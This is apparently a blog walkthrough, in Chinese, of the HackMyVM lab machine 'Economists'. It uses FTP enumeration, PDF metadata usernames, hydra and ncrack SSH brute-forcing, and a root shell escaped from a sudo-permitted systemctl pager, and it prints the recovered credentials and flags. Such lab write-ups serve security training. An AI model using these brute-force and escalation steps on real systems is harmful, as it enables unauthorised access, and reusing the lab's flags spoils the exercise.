---
title: Economists
author: hgbe02
date: 2024-04-15
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Economists.html"
---

# Economists

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404151237698.png" alt="image-20240415115114912" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404151237699.png" alt="image-20240415120027365" style="zoom: 50%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 192.168.0.200 -- -A
```

```text
Open 192.168.0.200:80
Open 192.168.0.200:21
Open 192.168.0.200:22

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.143
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
| -rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
| -rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
| -rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
| -rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
|_-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCwXTk2hpk3kYCB9R/x6h/MZK0hZ2uK5iqjYUW7wyb6Rz/a8UbYu5XMJ63fRg6wZ5u1NWSb9A6j0OBoSoh74drbY7saloYgDtALyCLaXiSxOt2Va4Px10H8xaAZeSLwz/ZKiRHiyu4uh4B4Tf/vFGDe4Np3cfcO2ftQYwhqGGVeaIbCFTDbnZBwOJ+Ezgj2yJOGBYEeYU+au7BogSulWABGdGr9XmxApVmTaPvinWe89vqkiyc3CZHDPbrJu02cYm3aJFVpcCGBIx6wZcx2gC8W2wS3iStOfg4SILPfyZKLU6g2d9VF1jVwGQoeAoMmZgxF7bmF1J9ZcYAhN8JmMfT2++D+aK+p4K2gz5KPZjIUO02RKdMOdzSIqN6K7yQMKjdKw7Ig+d9qvzn54hYKUbvpxcnHnw2IhPcBytW6pndDQhyZ0g5RAzSRlO1nvgt6QMmOTG1X/3OOgtPbIH0DnDFMVcl5YEUM8c2ebng7gSSUJDnUOiTPPYTbpJsEgYGWbU=
|   256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIVUhM/zlKMghGOQJ90nVnueTstnWLIWtn6ZH4zQDMqSM1vaX9Gtza7d2q0/91uTSyU7yx9pyjR7qnQwJUjTQFw=
|   256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIkYALtXLPsg30ZKCJbTRKnegoETlYTzlda2oKygf/cN
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Home - Elite Economists
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
gobuster dir -u http://192.168.0.200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,git,jpg,txt,png
```

```text
/images               (Status: 301) [Size: 315] [--> http://192.168.0.200/images/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.200/css/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.200/js/]
/readme.txt           (Status: 200) [Size: 410]
/fonts                (Status: 301) [Size: 314] [--> http://192.168.0.200/fonts/]
/server-status        (Status: 403) [Size: 278]
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404151237701.png" alt="image-20240415120422554" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404151237702.png" alt="image-20240415120439109" style="zoom: 50%;" />

查看源代码，找到一处疑似dns解析：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404151237703.png" alt="image-20240415121048065" style="zoom:50%;" />

### 敏感端口

匿名登录ftp服务，下载文件：

```bash
┌──(kali💀kali)-[~/temp/economists]
└─$ ftp 192.168.0.200
Connected to 192.168.0.200.
220 (vsFTPd 3.0.3)
Name (192.168.0.200:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||51645|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Sep 13  2023 .
drwxr-xr-x    2 0        119          4096 Sep 13  2023 ..
-rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
-rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
-rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
-rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
-rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
226 Directory send OK.
ftp> get Brochure-1.pdf
local: Brochure-1.pdf remote: Brochure-1.pdf
ftp: Can't access `Brochure-1.pdf': Permission denied
ftp> get Brochure-2.pdf
local: Brochure-2.pdf remote: Brochure-2.pdf
ftp: Can't access `Brochure-2.pdf': Permission denied
ftp> get Financial-infographics-poster.pdf
local: Financial-infographics-poster.pdf remote: Financial-infographics-poster.pdf
ftp: Can't access `Financial-infographics-poster.pdf': Permission denied
ftp> exit
221 Goodbye.

┌──(kali💀kali)-[~/temp/economists]
└─$ sudo su
[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali/temp/economists]
└─# ftp 192.168.0.200                                                                                                          
Connected to 192.168.0.200.
220 (vsFTPd 3.0.3)
Name (192.168.0.200:kali): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||43149|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Sep 13  2023 .
drwxr-xr-x    2 0        119          4096 Sep 13  2023 ..
-rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
-rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
-rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
-rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
-rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
226 Directory send OK.
ftp> get Brochure-1.pdf
local: Brochure-1.pdf remote: Brochure-1.pdf
229 Entering Extended Passive Mode (|||13946|)
150 Opening BINARY mode data connection for Brochure-1.pdf (173864 bytes).
100% |*************************************************************************|   169 KiB    3.23 MiB/s    00:00 ETA
226 Transfer complete.
173864 bytes received in 00:00 (3.20 MiB/s)
ftp> get Brochure-2.pdf
local: Brochure-2.pdf remote: Brochure-2.pdf
229 Entering Extended Passive Mode (|||48509|)
150 Opening BINARY mode data connection for Brochure-2.pdf (183931 bytes).
100% |*************************************************************************|  179 KiB    8.86 MiB/s    00:00 ETA
226 Transfer complete.
183931 bytes received in 00:00 (8.70 MiB/s)
ftp> get Financial-infographics-poster.pdf
local: Financial-infographics-poster.pdf remote: Financial-infographics-poster.pdf
229 Entering Extended Passive Mode (|||11366|)
150 Opening BINARY mode data connection for Financial-infographics-poster.pdf (465409 bytes).
100% |*************************************************************************|   454 KiB   14.88 MiB/s    00:00 ETA
226 Transfer complete.
465409 bytes received in 00:00 (14.42 MiB/s)
ftp> get Gameboard-poster.pdf
local: Gameboard-poster.pdf remote: Gameboard-poster.pdf
229 Entering Extended Passive Mode (|||52071|)
150 Opening BINARY mode data connection for Gameboard-poster.pdf (269546 bytes).
100% |*************************************************************************|   263 KiB    9.43 MiB/s    00:00 ETA
226 Transfer complete.
269546 bytes received in 00:00 (9.08 MiB/s)
ftp> get Growth-timeline.pdf
local: Growth-timeline.pdf remote: Growth-timeline.pdf
229 Entering Extended Passive Mode (|||36660|)
150 Opening BINARY mode data connection for Growth-timeline.pdf (126644 bytes).
100% |*************************************************************************|   123 KiB    5.56 MiB/s    00:00 ETA
226 Transfer complete.
126644 bytes received in 00:00 (5.42 MiB/s)
ftp> get Population-poster.pdf
local: Population-poster.pdf remote: Population-poster.pdf
229 Entering Extended Passive Mode (|||32397|)
150 Opening BINARY mode data connection for Population-poster.pdf (1170323 bytes).
100% |*************************************************************************|  1142 KiB   19.79 MiB/s    00:00 ETA
226 Transfer complete.
1170323 bytes received in 00:00 (19.67 MiB/s)
ftp> exit
221 Goodbye.
```

查看一下相关信息：

```bash
┌──(root㉿kali)-[/home/kali/temp/economists]
└─# exiftool Brochure-1.pdf     
ExifTool Version Number         : 12.76
File Name                       : Brochure-1.pdf
Directory                       : .
File Size                       : 174 kB
File Modification Date/Time     : 2023:09:13 00:00:00-04:00
File Access Date/Time           : 2024:04:15 00:18:41-04:00
File Inode Change Date/Time     : 2024:04:15 00:17:36-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.6
Linearized                      : No
Page Count                      : 2
XMP Toolkit                     : Image::ExifTool 12.40
Subject                         : We are here for your wealth
Title                           : Elite Economists brochure 1
Author                          : joseph
Creator                         : Impress
Producer                        : LibreOffice 7.3
Create Date                     : 2023:09:13 12:03:17+02:00
```

将所有文件信息搜集一下：

```bash
exiftool *.pdf | grep Author
```

```text
Author                          : joseph
Author                          : richard
Author                          : crystal
Author                          : catherine
Author                          : catherine
```

得到一份名单：

```apl
joseph
richard
crystal
catherine
```

### 查看敏感目录

```apl
http://192.168.0.200/readme.txt
```

```text
Thank you for using our template!

For more awesome templates please visit https://colorlib.com/wp/templates/

Copyright information for the template can't be altered/removed unless you purchase a license.
More information about the license is available here: https://colorlib.com/wp/licence/

Removing copyright information without the license will result in suspension of your hosting and/or domain name(s).
```

到处点点，没有发现啥东西。

### 爆破ssh

尝试爆破一下，未果（没运行完，但是一直不出）

尝试cewl一下，生成一个字典进行爆破：

```bash
┌──(root㉿kali)-[/home/kali/temp/economists]
└─# cewl -d 2 -m 5 -w pass.txt http://192.168.0.200
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

进行爆破：

```bash
hydra -L user.txt -P pass.txt ssh://192.168.0.200 -t 64
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404151237704.png" alt="image-20240415123101646" style="zoom:50%;" />

### ssh登录

```apl
joseph
wealthiest
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404151237705.png" alt="image-20240415123228880" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) joseph@elite-economists:/home/joseph$ whoami;id
joseph
uid=1001(joseph) gid=1001(joseph) groups=1001(joseph)
(remote) joseph@elite-economists:/home/joseph$ ls -la
total 32
drwxr-xr-x 4 joseph joseph 4096 Apr 15 04:30 .
drwxr-xr-x 6 root   root   4096 Sep 13  2023 ..
-rw------- 1 joseph joseph    0 Sep 14  2023 .bash_history
-rw-r--r-- 1 joseph joseph  220 Sep 13  2023 .bash_logout
-rw-r--r-- 1 joseph joseph 3771 Sep 13  2023 .bashrc
drwx------ 2 joseph joseph 4096 Apr 15 04:30 .cache
drwxrwxr-x 3 joseph joseph 4096 Sep 13  2023 .local
-rw-r--r-- 1 joseph joseph  807 Sep 13  2023 .profile
-rw-rw-r-- 1 joseph joseph 3271 Sep 14  2023 user.txt
(remote) joseph@elite-economists:/home/joseph$ cat user.txt 


                                                                                                    
                                                                                                    
                      ...................                 ....................                      
                 .............................        .............................                 
             ............              ...........     ......              ............             
           ........                         ........                             ........           
        ........              ...              ........           ....              .......         
       ......                .....         ..     ......          .....                ......       
     .............................        .....     ......        .............................     
    ..............................       .....        .....       ..............................    
                                        .....          .....                                        
                                       .....            .....                                       
                                      .....              .....                                      
                                      .....              .....                                      
                                     .....                ....                                      
 .................................................................................................. 
................................................................................................... 
                                     .....               .....                                      
                                      .....              .....                                      
                                      .....              .....                                      
                                       .....            .....                                       
                                        .....          .....                                        
    ..............................       .....        .....       ..............................    
     .............................        ......     .....        .............................     
       ......                .....         .......     ..         .....                ......       
        ........              ...            .......              ....              .......         
           ........                            .........                         ........           
             ...........               ......     ...........               ...........             
                ..............................       ..............................                 
                     .....................                ....................                      
                                                                                                    
                                                                                                    
Flag: HMV{37q3p33CsMJgJQbrbYZMUFfTu}
(remote) joseph@elite-economists:/home/joseph$ find / -perm -u=s -type f 2>/dev/null
/snap/core20/2015/usr/bin/chfn
/snap/core20/2015/usr/bin/chsh
/snap/core20/2015/usr/bin/gpasswd
/snap/core20/2015/usr/bin/mount
/snap/core20/2015/usr/bin/newgrp
/snap/core20/2015/usr/bin/passwd
/snap/core20/2015/usr/bin/su
/snap/core20/2015/usr/bin/sudo
/snap/core20/2015/usr/bin/umount
/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2015/usr/lib/openssh/ssh-keysign
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/20092/usr/lib/snapd/snap-confine
/snap/snapd/18357/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/at
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
(remote) joseph@elite-economists:/home/joseph$ sudo -l
Matching Defaults entries for joseph on elite-economists:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joseph may run the following commands on elite-economists:
    (ALL) NOPASSWD: /usr/bin/systemctl status
(remote) joseph@elite-economists:/home/joseph$ sudo /usr/bin/systemctl status
● elite-economists
    State: running
     Jobs: 0 queued
   Failed: 0 units
    Since: Mon 2024-04-15 03:59:24 UTC; 34min ago
   CGroup: /
           ├─user.slice 
           │ └─user-1001.slice 
           │   ├─user@1001.service …
           │   │ └─init.scope 
           │   │   ├─1548 /lib/systemd/systemd --user
           │   │   └─1551 (sd-pam)
           │   └─session-4.scope 
           │     ├─1533 sshd: joseph [priv]
           │     ├─1634 sshd: joseph@pts/0
           │     ├─1635 -bash
           │     ├─1704 sudo /usr/bin/systemctl status
           │     ├─1705 /usr/bin/systemctl status
           │     └─1706 pager
           ├─init.scope 
           │ └─1 /sbin/init maybe-ubiquity
           └─system.slice 
             ├─apache2.service 
             │ ├─753 /usr/sbin/apache2 -k start
             │ ├─755 /usr/sbin/apache2 -k start
             │ └─756 /usr/sbin/apache2 -k start
             ├─systemd-networkd.service 
             │ └─640 /lib/systemd/systemd-networkd
             ├─systemd-udevd.service 
             │ └─398 /lib/systemd/systemd-udevd
             ├─cron.service 
             │ └─658 /usr/sbin/cron -f
             ├─polkit.service 
             │ └─681 /usr/lib/policykit-1/polkitd --no-debug
             ├─networkd-dispatcher.service 
             │ └─680 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
             ├─multipathd.service 
             │ └─558 /sbin/multipathd -d -s
             ├─accounts-daemon.service 
             │ └─654 /usr/lib/accountsservice/accounts-daemon
             ├─ModemManager.service 
             │ └─730 /usr/sbin/ModemManager
             ├─systemd-journald.service 
             │ └─362 /lib/systemd/systemd-journald
```

### 尝试提权

好像可以输入命令，尝试提权一下？和vim一样的方法试一下：

```bash
(remote) joseph@elite-economists:/home/joseph$ sudo /usr/bin/systemctl status
● elite-economists
    State: running
     Jobs: 0 queued
   Failed: 0 units
    Since: Mon 2024-04-15 03:59:24 UTC; 36min ago
   CGroup: /
           ├─user.slice 
           │ └─user-1001.slice 
           │   ├─user@1001.service …
           │   │ └─init.scope 
           │   │   ├─1548 /lib/systemd/systemd --user
           │   │   └─1551 (sd-pam)
           │   └─session-4.scope 
           │     ├─1533 sshd: joseph [priv]
           │     ├─1634 sshd: joseph@pts/0
           │     ├─1635 -bash
           │     ├─1712 sudo /usr/bin/systemctl status
           │     ├─1713 /usr/bin/systemctl status
           │     └─1714 pager
           ├─init.scope 
           │ └─1 /sbin/init maybe-ubiquity
           └─system.slice 
             ├─apache2.service 
             │ ├─753 /usr/sbin/apache2 -k start
             │ ├─755 /usr/sbin/apache2 -k start
             │ └─756 /usr/sbin/apache2 -k start
             ├─systemd-networkd.service 
             │ └─640 /lib/systemd/systemd-networkd
             ├─systemd-udevd.service 
             │ └─398 /lib/systemd/systemd-udevd
             ├─cron.service 
             │ └─658 /usr/sbin/cron -f
             ├─polkit.service 
             │ └─681 /usr/lib/policykit-1/polkitd --no-debug
             ├─networkd-dispatcher.service 
             │ └─680 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
             ├─multipathd.service 
             │ └─558 /sbin/multipathd -d -s
             ├─accounts-daemon.service 
             │ └─654 /usr/lib/accountsservice/accounts-daemon
             ├─ModemManager.service 
             │ └─730 /usr/sbin/ModemManager
             ├─systemd-journald.service 
             │ └─362 /lib/systemd/systemd-journald
!/bin/bash
root@elite-economists:/home/joseph# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
root@elite-economists:/home/joseph# cd /root
root@elite-economists:~# ls -la
total 36
drwx------  5 root root 4096 Sep 14  2023 .
drwxr-xr-x 19 root root 4096 Sep 12  2023 ..
-rw-------  1 root root    0 Sep 14  2023 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-------  1 root root   65 Sep 13  2023 .lesshst
drwxr-xr-x  3 root root 4096 Sep 12  2023 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root 3271 Sep 14  2023 root.txt
drwx------  3 root root 4096 Sep 12  2023 snap
drwx------  2 root root 4096 Sep 12  2023 .ssh
root@elite-economists:~# cat root.txt 


                                                                                                    
                                                                                                    
                      ...................                 ....................                      
                 .............................        .............................                 
             ............              ...........     ......              ............             
           ........                         ........                             ........           
        ........              ...              ........           ....              .......         
       ......                .....         ..     ......          .....                ......       
     .............................        .....     ......        .............................     
    ..............................       .....        .....       ..............................    
                                        .....          .....                                        
                                       .....            .....                                       
                                      .....              .....                                      
                                      .....              .....                                      
                                     .....                ....                                      
 .................................................................................................. 
................................................................................................... 
                                     .....               .....                                      
                                      .....              .....                                      
                                      .....              .....                                      
                                       .....            .....                                       
                                        .....          .....                                        
    ..............................       .....        .....       ..............................    
     .............................        ......     .....        .............................     
       ......                .....         .......     ..         .....                ......       
        ........              ...            .......              ....              .......         
           ........                            .........                         ........           
             ...........               ......     ...........               ...........             
                ..............................       ..............................                 
                     .....................                ....................                      
                                                                                                    
                                                                                                    
Flag: HMV{NwER6XWyM8p5VpeFEkkcGYyeJ}
```







## 额外收获

### ftp一键下载文件

ftp下载文件也可以使用下面师傅的方法，不用手动一个一个get了！

https://emvee-nl.github.io/posts/HackMyVM-Writeup-Economists/

```bash
wget -m ftp://ftp:@192.168.0.200
```

```bash
┌──(root㉿kali)-[/home/kali/temp/economists]
└─# wget -m ftp://ftp:@192.168.0.200
--2024-04-15 00:16:22--  ftp://ftp:*password*@192.168.0.200/
           => ‘192.168.0.200/.listing’
Connecting to 192.168.0.200:21... connected.
Logging in as ftp ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

192.168.0.200/.listing                    [=========================================>]     588  --.-KB/s    in 0s      

2024-04-15 00:16:22 (143 MB/s) - ‘192.168.0.200/.listing’ saved [588]

--2024-04-15 00:16:22--  ftp://ftp:*password*@192.168.0.200/Brochure-1.pdf
           => ‘192.168.0.200/Brochure-1.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Brochure-1.pdf ... done.
Length: 173864 (170K)

192.168.0.200/Brochure-1.pdf          100%[=========================================>] 169.79K  --.-KB/s    in 0.001s  

2024-04-15 00:16:22 (204 MB/s) - ‘192.168.0.200/Brochure-1.pdf’ saved [173864]

--2024-04-15 00:16:22--  ftp://ftp:*password*@192.168.0.200/Brochure-2.pdf
           => ‘192.168.0.200/Brochure-2.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Brochure-2.pdf ... done.
Length: 183931 (180K)

192.168.0.200/Brochure-2.pdf          100%[=========================================>] 179.62K  --.-KB/s    in 0.001s  

2024-04-15 00:16:22 (228 MB/s) - ‘192.168.0.200/Brochure-2.pdf’ saved [183931]

--2024-04-15 00:16:22--  ftp://ftp:*password*@192.168.0.200/Financial-infographics-poster.pdf
           => ‘192.168.0.200/Financial-infographics-poster.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Financial-infographics-poster.pdf ... done.
Length: 465409 (455K)

192.168.0.200/Financial-infographics- 100%[=========================================>] 454.50K  --.-KB/s    in 0.002s  

2024-04-15 00:16:22 (284 MB/s) - ‘192.168.0.200/Financial-infographics-poster.pdf’ saved [465409]

--2024-04-15 00:16:22--  ftp://ftp:*password*@192.168.0.200/Gameboard-poster.pdf
           => ‘192.168.0.200/Gameboard-poster.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Gameboard-poster.pdf ... done.
Length: 269546 (263K)

192.168.0.200/Gameboard-poster.pdf    100%[=========================================>] 263.23K  --.-KB/s    in 0.001s  

2024-04-15 00:16:22 (327 MB/s) - ‘192.168.0.200/Gameboard-poster.pdf’ saved [269546]

--2024-04-15 00:16:22--  ftp://ftp:*password*@192.168.0.200/Growth-timeline.pdf
           => ‘192.168.0.200/Growth-timeline.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Growth-timeline.pdf ... done.
Length: 126644 (124K)

192.168.0.200/Growth-timeline.pdf     100%[=========================================>] 123.68K  --.-KB/s    in 0s      

2024-04-15 00:16:22 (362 MB/s) - ‘192.168.0.200/Growth-timeline.pdf’ saved [126644]

--2024-04-15 00:16:22--  ftp://ftp:*password*@192.168.0.200/Population-poster.pdf
           => ‘192.168.0.200/Population-poster.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Population-poster.pdf ... done.
Length: 1170323 (1.1M)

192.168.0.200/Population-poster.pdf   100%[=========================================>]   1.12M  --.-KB/s    in 0.007s  

2024-04-15 00:16:22 (168 MB/s) - ‘192.168.0.200/Population-poster.pdf’ saved [1170323]

FINISHED --2024-04-15 00:16:22--
Total wall clock time: 0.05s
Downloaded: 7 files, 2.3M in 0.01s (209 MB/s)
```

### ncrack爆破ssh

之前记录过了，但是忘了，再记录一下：

来自`greenbrother`的blog：https://kerszl.github.io/hacking/walkthrough/Economists/

```bash
ncrack -v -U users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.16.1.178
```